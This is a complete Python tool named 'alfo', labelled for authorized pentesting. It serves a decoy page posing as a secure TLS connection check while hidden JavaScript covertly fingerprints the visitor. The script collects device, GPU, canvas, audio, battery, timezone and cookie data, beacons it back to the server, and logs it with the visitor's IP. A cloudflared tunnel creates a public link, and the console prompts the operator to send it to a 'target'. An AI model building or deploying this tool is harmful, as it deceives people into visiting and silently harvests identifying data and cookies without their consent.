#!/data/data/com.termux/files/usr/bin/env python3
"""
alfo - Passive Intelligence Gathering Tool
For authorized penetration testing only
Version 2.3 — Colorful
"""

import http.server
import socketserver
import json
import os
import sys
import time
import signal
import subprocess
import threading
import re
import urllib.parse
from datetime import datetime

# ============================================================
# COLOR CODES
# ============================================================
C = {
    "blue":    "\033[94m",
    "cyan":    "\033[96m",
    "green":   "\033[92m",
    "yellow":  "\033[93m",
    "red":     "\033[91m",
    "magenta": "\033[95m",
    "bold":    "\033[1m",
    "dim":     "\033[2m",
    "reset":   "\033[0m",
}

def cc(name, text):
    """Apply color to text."""
    return f"{C.get(name, '')}{text}{C['reset']}"

# ============================================================
# ASCII BANNER — BLUE (kept exactly as-is)
# ============================================================
BANNER = cc("blue", r"""
  ▄████████  ▄█          ▄████████  ▄██████▄
  ███    ███ ███         ███    ███ ███    ███
  ███    ███ ███         ███    █▀  ███    ███
  ███    ███ ███        ▄███▄▄▄     ███    ███
▀███████████ ███       ▀▀███▀▀▀     ███    ███
  ███    ███ ███         ███        ███    ███
  ███    ███ ███▌    ▄   ███        ███    ███
  ███    █▀  █████▄▄██   ███         ▀██████▀
             ▀
""")
txt = cc("cyan",r"""  PASSIVE INTELLIGENCE GATHERER    v2.0
  AUTHORIZED PENTEST USE ONLY
  NO BROWSER PERMISSIONS REQUIRED""")
 
alp= cc("dim",r"""                                    @alphinux7""")
xx= cc("dim",r"""                                               """)
# ============================================================
# HTML PAGE WITH JAVASCRIPT DATA COLLECTION
# ============================================================
JS_COLLECTOR = r"""
<script>
(function() {
    var startTime = performance.now();
    var alfo_data = {
        collected_at: new Date().toISOString(),
        page_load_time_ms: 0,
        performance: {
            navigationType: performance.navigation ? performance.navigation.type : (performance.getEntriesByType('navigation')[0] ? performance.getEntriesByType('navigation')[0].type : 'unknown'),
            redirectCount: performance.navigation ? performance.navigation.redirectCount : 0,
            timing: {
                domContentLoadedEventEnd: performance.timing ? performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart : 0,
                loadEventEnd: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
                domInteractive: performance.timing ? performance.timing.domInteractive - performance.timing.navigationStart : 0
            }
        },
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            availLeft: screen.availLeft || 0,
            availTop: screen.availTop || 0,
            orientation: screen.orientation ? screen.orientation.type : 'unknown',
            orientationAngle: screen.orientation ? screen.orientation.angle : 0
        },
        window: {
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight,
            devicePixelRatio: window.devicePixelRatio || 1,
            pageYOffset: window.pageYOffset,
            pageXOffset: window.pageXOffset,
            screenTop: window.screenTop || window.screenY || 0,
            screenLeft: window.screenLeft || window.screenX || 0
        },
        navigator: {
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages ? Array.from(navigator.languages).join(',') : '',
            platform: navigator.platform || '',
            vendor: navigator.vendor || '',
            vendorSub: navigator.vendorSub || '',
            product: navigator.product || '',
            productSub: navigator.productSub || '',
            appName: navigator.appName || '',
            appVersion: navigator.appVersion || '',
            appCodeName: navigator.appCodeName || '',
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            hardwareConcurrency: navigator.hardwareConcurrency || 0,
            deviceMemory: navigator.deviceMemory || 0,
            maxTouchPoints: navigator.maxTouchPoints || 0,
            doNotTrack: navigator.doNotTrack || '',
            pdfViewerEnabled: navigator.pdfViewerEnabled || false,
            webdriver: navigator.webdriver || false,
            javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
            buildID: navigator.buildID || '',
            oscpu: navigator.oscpu || '',
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                downlinkMax: navigator.connection.downlinkMax || 0,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData,
                type: navigator.connection.type
            } : null
        },
        timezone: {
            offset: new Date().getTimezoneOffset(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
            locale: Intl.DateTimeFormat().resolvedOptions().locale || '',
            calendar: Intl.DateTimeFormat().resolvedOptions().calendar || '',
            numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem || ''
        },
        storage: {
            localStorage: typeof localStorage !== 'undefined',
            sessionStorage: typeof sessionStorage !== 'undefined',
            localStorageLength: typeof localStorage !== 'undefined' ? localStorage.length : 0,
            sessionStorageLength: typeof sessionStorage !== 'undefined' ? sessionStorage.length : 0
        },
        css: {
            touchEnabled: 'ontouchstart' in window,
            pointerFine: matchMedia ? matchMedia('(pointer: fine)').matches : false,
            pointerCoarse: matchMedia ? matchMedia('(pointer: coarse)').matches : false,
            hoverHover: matchMedia ? matchMedia('(hover: hover)').matches : false,
            hoverNone: matchMedia ? matchMedia('(hover: none)').matches : false,
            anyPointerFine: matchMedia ? matchMedia('(any-pointer: fine)').matches : false,
            anyPointerCoarse: matchMedia ? matchMedia('(any-pointer: coarse)').matches : false,
            anyHoverHover: matchMedia ? matchMedia('(any-hover: hover)').matches : false,
            anyHoverNone: matchMedia ? matchMedia('(any-hover: none)').matches : false,
            colorGamut: matchMedia ? (matchMedia('(color-gamut: srgb)').matches ? 'srgb' : matchMedia('(color-gamut: p3)').matches ? 'p3' : matchMedia('(color-gamut: rec2020)').matches ? 'rec2020' : 'unknown') : 'unknown',
            monochrome: matchMedia ? matchMedia('(monochrome: 0)').matches ? false : true : false,
            invertedColors: matchMedia ? (matchMedia('(inverted-colors: inverted)').matches ? 'inverted' : 'none') : 'unknown',
            prefersReducedMotion: matchMedia ? matchMedia('(prefers-reduced-motion: reduce)').matches : false,
            prefersColorScheme: matchMedia ? (matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light') : 'unknown',
            prefersContrast: matchMedia ? (matchMedia('(prefers-contrast: high)').matches ? 'high' : matchMedia('(prefers-contrast: low)').matches ? 'low' : 'no-preference') : 'unknown',
            prefersReducedTransparency: matchMedia ? matchMedia('(prefers-reduced-transparency: reduce)').matches : false,
            forcedColors: matchMedia ? matchMedia('(forced-colors: active)').matches : false
        },
        fonts: document.fonts ? { status: document.fonts.status, length: document.fonts.size } : null,
        dom: {
            scripts: document.scripts ? document.scripts.length : 0,
            images: document.images ? document.images.length : 0,
            links: document.links ? document.links.length : 0,
            forms: document.forms ? document.forms.length : 0,
            embeds: document.embeds ? document.embeds.length : 0,
            plugins: navigator.plugins ? navigator.plugins.length : 0,
            mimeTypes: navigator.mimeTypes ? navigator.mimeTypes.length : 0
        },
        page: {
            referrer: document.referrer || '',
            url: window.location.href,
            domain: document.domain,
            cookies: document.cookie || '',
            title: document.title,
            charset: document.characterSet || document.charset || '',
            lastModified: document.lastModified || ''
        },
        geolocation_support: !!navigator.geolocation,
        mediaDevices_support: !!(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices),
        bluetooth_support: !!navigator.bluetooth,
        usb_support: !!navigator.usb,
        nfc_support: !!navigator.nfc,
        serial_support: !!navigator.serial,
        hid_support: !!navigator.hid,
        webgl_support: (function() {
            try { var c = document.createElement('canvas'); return !!(c.getContext('webgl') || c.getContext('experimental-webgl')); } catch(e) { return false; }
        })(),
        webgl_renderer: (function() {
            try {
                var c = document.createElement('canvas');
                var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                if (gl) {
                    var ext = gl.getExtension('WEBGL_debug_renderer_info');
                    if (ext) return { vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) };
                }
            } catch(e) {}
            return null;
        })(),
        canvas_fingerprint: (function() {
            try {
                var c = document.createElement('canvas');
                c.width = 200; c.height = 50;
                var ctx = c.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 200, 50);
                ctx.fillStyle = '#069';
                ctx.fillText('alfo', 10, 15);
                var dataUrl = c.toDataURL();
                return dataUrl.length > 100 ? dataUrl.substring(0, 100) + '...' : dataUrl;
            } catch(e) { return null; }
        })()
    };

    if (document.fonts && document.fonts.size > 0) {
        var fontList = [];
        for (var f of document.fonts) {
            fontList.push(f.family + ' ' + f.style + ' ' + f.weight);
        }
        alfo_data.fonts.fonts_available = fontList;
    }

    try {
        var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        var analyser = audioCtx.createAnalyser();
        var gain = audioCtx.createGain();
        var oscillator = audioCtx.createOscillator();
        oscillator.connect(analyser);
        analyser.connect(gain);
        gain.connect(audioCtx.destination);
        oscillator.frequency.value = 440;
        oscillator.type = 'sine';
        alfo_data.audio = {
            sampleRate: audioCtx.sampleRate,
            maxChannelCount: audioCtx.destination ? audioCtx.destination.maxChannelCount || 0 : 0,
            state: audioCtx.state,
            baseLatency: audioCtx.baseLatency || 0,
            outputLatency: audioCtx.outputLatency || 0
        };
        audioCtx.close();
    } catch(e) {
        alfo_data.audio = null;
    }

    alfo_data.page_load_time_ms = performance.now() - startTime;

    if (navigator.getBattery) {
        navigator.getBattery().then(function(battery) {
            alfo_data.battery = {
                charging: battery.charging,
                level: battery.level,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
            sendData(alfo_data);
        }).catch(function() {
            alfo_data.battery = null;
            sendData(alfo_data);
        });
    } else {
        alfo_data.battery = null;
        sendData(alfo_data);
    }

    function sendData(data) {
        var payload = JSON.stringify(data);
        if (navigator.sendBeacon) {
            navigator.sendBeacon('/_collect', payload);
        } else {
            try {
                fetch('/_collect', { method: 'POST', body: payload, keepalive: true, credentials: 'include' }).catch(function(){});
            } catch(e) {
                try {
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', '/_collect', true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(payload);
                } catch(e2) {}
            }
        }
    }
})();
</script>
"""

HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
    color: #fff; min-height: 100vh;
    display: flex; justify-content: center; align-items: center;
    flex-direction: column; padding: 20px;
}
.container { text-align: center; max-width: 600px; }
h1 { font-size: 2em; margin-bottom: 20px;
    background: linear-gradient(90deg, #00d2ff, #3a7bd5);
    -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
p { color: #aaa; font-size: 1.1em; line-height: 1.6; }
.loader { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #00d2ff;
    border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite;
    margin: 30px auto; }
@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
.status { margin-top: 20px; font-size: 0.9em; color: #666; }
</style>
</head>
<body>
<div class="container">
    <div class="loader"></div>
    <h1>Establishing Secure Connection</h1>
    <p>Please wait while we verify your session...</p>
    <div class="status">TLS handshake in progress</div>
</div>
""" + JS_COLLECTOR + """
</body>
</html>"""


# ============================================================
# HTTP REQUEST HANDLER
# ============================================================

class AlfoHandler(http.server.BaseHTTPRequestHandler):
    server_version = "Cloudflare-nginx"
    sys_version = ""

    def log_message(self, format, *args):
        pass

    def _get_headers_dict(self):
        return {k.lower(): v for k, v in self.headers.items()}

    def _parse_ua_manual(self, ua):
        info = {"raw": ua}

        if "Chrome/" in ua and "Chromium" not in ua:
            info["browser"] = "Chrome"
            m = re.search(r'Chrome/([\d.]+)', ua)
        elif "Firefox/" in ua:
            info["browser"] = "Firefox"
            m = re.search(r'Firefox/([\d.]+)', ua)
        elif "Safari/" in ua and "Chrome" not in ua:
            info["browser"] = "Safari"
            m = re.search(r'Safari/([\d.]+)', ua)
        elif "Edg/" in ua:
            info["browser"] = "Edge"
            m = re.search(r'Edg/([\d.]+)', ua)
        elif "OPR/" in ua or "Opera" in ua:
            info["browser"] = "Opera"
            m = re.search(r'(?:OPR|Opera)/([\d.]+)', ua)
        else:
            info["browser"] = "Other"
            m = None
        if m:
            info["browser_version"] = m.group(1)

        if "Android" in ua:
            info["os"] = "Android"
            m = re.search(r'Android\s?([\d.]+)', ua)
        elif "iPhone" in ua or "iPad" in ua:
            info["os"] = "iOS"
            m = re.search(r'(?:iOS|iPhone OS|like Mac OS X)\s?([\d_.]+)', ua)
        elif "Windows NT" in ua:
            info["os"] = "Windows"
            m = re.search(r'Windows NT\s?([\d.]+)', ua)
        elif "Mac OS X" in ua:
            info["os"] = "macOS"
            m = re.search(r'Mac OS X\s?([\d_.]+)', ua)
        elif "CrOS" in ua:
            info["os"] = "ChromeOS"
            m = None
        else:
            info["os"] = "Linux/Other"
            m = None
        if m:
            info["os_version"] = m.group(1).replace('_', '.')

        if "iPhone" in ua:
            info["device"] = "iPhone"; info["is_mobile"] = True
        elif "iPad" in ua:
            info["device"] = "iPad"; info["is_mobile"] = True
        elif "Android" in ua:
            if "Mobile" in ua:
                info["device"] = "Android Phone"; info["is_mobile"] = True
            else:
                info["device"] = "Android Tablet"; info["is_tablet"] = True
        elif "Windows Phone" in ua:
            info["device"] = "Windows Phone"; info["is_mobile"] = True
        else:
            info["device"] = "Desktop"; info["is_pc"] = True

        bots = ["bot", "crawl", "spider", "scrape", "curl", "wget",
                "python", "Go-http", "fetch", "HttpClient", "AHC",
                "okhttp", "Dart", "perl", "ruby", "nmap", "zgrab"]
        info["is_bot"] = any(b in ua.lower() for b in bots)

        return info

    def _capture(self, header_info, js_data=None):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        ip = self.client_address[0]
        safe_ip = ip.replace('.', '_').replace(':', '_')

        ua = header_info.get('user-agent', '')
        ua_parsed = self._parse_ua_manual(ua)

        capture = {
            "capture_time": datetime.now().isoformat(),
            "source_ip": ip,
            "request": {"method": self.command, "path": self.path, "version": self.request_version},
            "headers": header_info,
            "user_agent_parsed": ua_parsed,
            "js_client_data": js_data if js_data else {}
        }

        data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "alfo_data", "captures")
        os.makedirs(data_dir, exist_ok=True)
        filename = f"capture_{timestamp}_{safe_ip}.json"
        filepath = os.path.join(data_dir, filename)

        with open(filepath, 'w') as f:
            json.dump(capture, f, indent=2)

        self._display_capture(capture, filename)

    def _display_capture(self, capture, filename):
        ip = capture["source_ip"]
        ua = capture["user_agent_parsed"]
        js = capture.get("js_client_data", {})
        hdrs = capture.get("headers", {})

        ts = capture["capture_time"].split('.')[0].replace('T', ' ')
        print(f"\n  {cc('green', '[NEW]')} {cc('cyan', ts)} {cc('dim', '|')} {cc('yellow', ip)}")
        print(f"  {cc('magenta', 'Browser:')}    {cc('bold', ua.get('browser','?'))} {cc('dim', ua.get('browser_version',''))}")
        print(f"  {cc('magenta', 'OS:')}          {ua.get('os','?')} {cc('dim', ua.get('os_version',''))}")
        device_str = ua.get('device', '?')
        if ua.get('is_bot'):
            device_str += cc('red', ' [BOT]')
        print(f"  {cc('magenta', 'Device:')}     {device_str}")
        if hdrs.get('referer'):
            ref = hdrs['referer'][:70]
            print(f"  {cc('magenta', 'Referer:')}    {cc('dim', ref)}")
        if hdrs.get('x-forwarded-for'):
            print(f"  {cc('magenta', 'XFF:')}        {cc('dim', hdrs['x-forwarded-for'])}")
        if hdrs.get('accept-language'):
            print(f"  {cc('magenta', 'Accept-Lang:')} {cc('dim', hdrs['accept-language'])}")

        s = js.get('screen', {})
        w = js.get('window', {})
        n = js.get('navigator', {})
        tz = js.get('timezone', {})
        bat = js.get('battery')
        conn = n.get('connection')
        gl = js.get('webgl_renderer')
        css = js.get('css', {})
        page = js.get('page', {})

        if s:
            res = f"{s.get('width','?')}x{s.get('height','?')} @ {s.get('colorDepth','?')}bit"
            print(f"  {cc('magenta', 'Screen:')}   {cc('cyan', res)}")
        if w and w.get('devicePixelRatio', 1) != 1:
            print(f"  {cc('magenta', 'PixelRatio:')} {cc('cyan', str(w['devicePixelRatio']) + 'x')}")
        if n:
            if n.get('platform'):
                print(f"  {cc('magenta', 'Platform:')}  {cc('green', n['platform'])}")
            if n.get('hardwareConcurrency'):
                print(f"  {cc('magenta', 'CPU Cores:')} {cc('green', str(n['hardwareConcurrency']))}")
            if n.get('deviceMemory'):
                print(f"  {cc('magenta', 'RAM:')}       {cc('green', str(n['deviceMemory']) + ' GB')}")
            if conn:
                net = f"{conn.get('effectiveType','?')} ({conn.get('downlink','?')} Mbps, RTT {conn.get('rtt','?')}ms)"
                print(f"  {cc('magenta', 'Network:')}  {cc('cyan', net)}")
        if tz:
            offset = tz.get('offset', 0)
            sign = '+' if offset <= 0 else '-'
            hours = abs(offset) // 60
            mins = abs(offset) % 60
            tz_str = f"{tz.get('timezone','?')} (UTC{sign}{hours:02d}:{mins:02d})"
            print(f"  {cc('magenta', 'Timezone:')} {cc('yellow', tz_str)}")
        if bat:
            bat_str = f"{bat.get('level',0)*100:.0f}%"
            if bat.get('charging'):
                bat_str += cc('green', ' [CHARGING]')
            print(f"  {cc('magenta', 'Battery:')}  {cc('yellow', bat_str)}")
        if css:
            mode = css.get('prefersColorScheme', '?')
            mode_color = 'cyan' if mode == 'dark' else 'yellow'
            print(f"  {cc('magenta', 'Theme:')}    {cc(mode_color, mode)}")
        if gl:
            renderer = gl.get('renderer', '')
            if len(renderer) > 50:
                renderer = renderer[:47] + '...'
            print(f"  {cc('magenta', 'GPU:')}       {cc('cyan', renderer)}")
        if audio := js.get('audio'):
            print(f"  {cc('magenta', 'Audio SR:')} {cc('cyan', str(audio.get('sampleRate','?')) + ' Hz')}")
        if page and page.get('cookies'):
            ck = page['cookies'][:60]
            suffix = '...' if len(page['cookies']) > 60 else ''
            print(f"  {cc('magenta', 'Cookies:')}  {cc('red', ck + suffix)}")
        print(f"  {cc('magenta', 'Saved:')}   {cc('dim', filename)}")
        print(f"  {cc('blue', '─' * 58)}")

    def do_GET(self):
        if self.path == '/':
            header_info = self._get_headers_dict()
            self._capture(header_info)
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Server', 'Cloudflare-nginx')
            self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
            self.send_header('Pragma', 'no-cache')
            self.send_header('Expires', '0')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Referrer-Policy', 'unsafe-url')
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode('utf-8'))
        else:
            self.send_response(404)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Not Found')

    def do_POST(self):
        if self.path == '/_collect':
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                try:
                    body = self.rfile.read(content_length)
                    js_data = json.loads(body.decode('utf-8'))
                    header_info = self._get_headers_dict()
                    self._capture(header_info, js_data)
                except (json.JSONDecodeError, UnicodeDecodeError):
                    pass
            self.send_response(204)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def do_HEAD(self):
        self.do_GET()


# ============================================================
# CLOUDFLARED MANAGER
# ============================================================

class CloudflaredManager:
    def __init__(self, port):
        self.port = port
        self.process = None
        self.url = None

    def start(self):
        print(f"  {cc('bold', 'Starting Cloudflared quick tunnel...')}")
        cmd = ["cloudflared", "tunnel", "--url", f"http://localhost:{self.port}"]
        self.process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            universal_newlines=True, bufsize=1
        )

        url_pattern = re.compile(r'(https://[a-zA-Z0-9-]+\.trycloudflare\.com)')
        timeout = 30
        start_time = time.time()
        lines = []

        for line in iter(self.process.stdout.readline, ''):
            lines.append(line)
            match = url_pattern.search(line)
            if match:
                self.url = match.group(1)
                print(f"  {cc('green', '[+] Tunnel URL:')} {cc('cyan', self.url)}\n")
                return True
            if time.time() - start_time > timeout:
                for l in lines[-3:]:
                    print(f"  {cc('dim', l.rstrip())}")
                print(f"  {cc('red', '[!] Timed out waiting for tunnel URL')}")
                return False
        return False

    def stop(self):
        if self.process and self.process.poll() is None:
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.process.kill()


# ============================================================
# MAIN
# ============================================================

def print_box(title, content, color="cyan"):
    """Print a boxed message with border."""
    print(f"  {cc('blue', '══════════════════════════════════════════════════════════')}")
    print(f"  {cc('blue', '')}  {cc(color, f'{title:<56}')} {cc('blue', '')}")
    print(f"  {cc('blue', '')}  {cc('blue', ' ' * 56)} {cc('blue', '')}")
    for line in content.split('\n'):
        print(f"  {cc('blue', '')}  {line:<56} {cc('blue', '')}")
    print(f"  {cc('blue', '══════════════════════════════════════════════════════════')}")

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(BANNER)
    print(txt)
    print(alp)
    print(xx)
    port = 8080
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            port = 8080

    data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "alfo_data", "captures")
    os.makedirs(data_dir, exist_ok=True)

    # ── PUBLIC LINK TOGGLE ──
    
    ans = input(f"  {cc('yellow', '[?] GENERATE PUBLIC LINK [y/n]:')} ").strip().lower()
    use_tunnel = ans != 'n'

    print(f"\n  {cc('bold', 'Starting server on')} {cc('cyan', '0.0.0.0:' + str(port))}...")

    server = socketserver.TCPServer(("0.0.0.0", port), AlfoHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    print(f"  {cc('green', '[+] Server running on')} {cc('cyan', 'http://0.0.0.0:' + str(port))}")

    tunnel_url = None
    cf = None
    if use_tunnel:
        if not _check_cloudflared():
            print(f"  {cc('red', '[!] cloudflared not found.')} Install: {cc('cyan', 'pkg install cloudflared')}")
            print(f"  {cc('yellow', '[+] Continuing in local-only mode')} ({cc('dim', 'http://localhost:' + str(port))})\n")
            use_tunnel = False
        else:
            cf = CloudflaredManager(port)
            if cf.start():
                tunnel_url = cf.url
            else:
                print(f"  {cc('red', '[!] Tunnel failed.')} {cc('yellow', 'Continuing in local-only mode.')}\n")
                use_tunnel = False

    print(f"  {cc('yellow', 'Captures')}     : {cc('dim', data_dir)}")
    print(f"  {cc('yellow', 'Stop with')}    : {cc('bold', 'Ctrl+C')}\n")

    if tunnel_url:
        print_box(
            "SEND THIS LINK TO TARGET",
            tunnel_url + "\n" + cc('dim', '(paste in browser)'),
            "green"
        )
        print()
    elif use_tunnel is False:
        lan_ip = "192.168.x.x"
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            lan_ip = s.getsockname()[0]
            s.close()
        except:
            pass
        print(f"  {cc('cyan', 'Local only')} — share {cc('green', 'http://' + lan_ip + ':' + str(port))} manually\n")
    print(f"  {cc('bold', cc('blue', '  Waiting for visitors...'))}")
    print()

    existing = set(os.listdir(data_dir)) if os.path.exists(data_dir) else set()
    captured_count = len(existing)

    try:
        while True:
            time.sleep(0.5)
            if os.path.exists(data_dir):
                current = set(os.listdir(data_dir))
                if len(current) > captured_count:
                    captured_count = len(current)
                existing = current
    except KeyboardInterrupt:
        print(f"\n\n  {cc('yellow', 'Shutting down...')}")

    if cf:
        cf.stop()
    server.shutdown()

    print(f"  {cc('green', 'Done.')} {cc('bold', str(captured_count))} {cc('dim', 'capture(s) saved to')} {cc('dim', data_dir + '/')}")
    print()


def _check_cloudflared():
    for cmd in ["cloudflared", "./cloudflared"]:
        try:
            r = subprocess.run([cmd, "--version"], capture_output=True, timeout=5)
            if r.returncode == 0:
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    return False


if __name__ == "__main__":
    main()
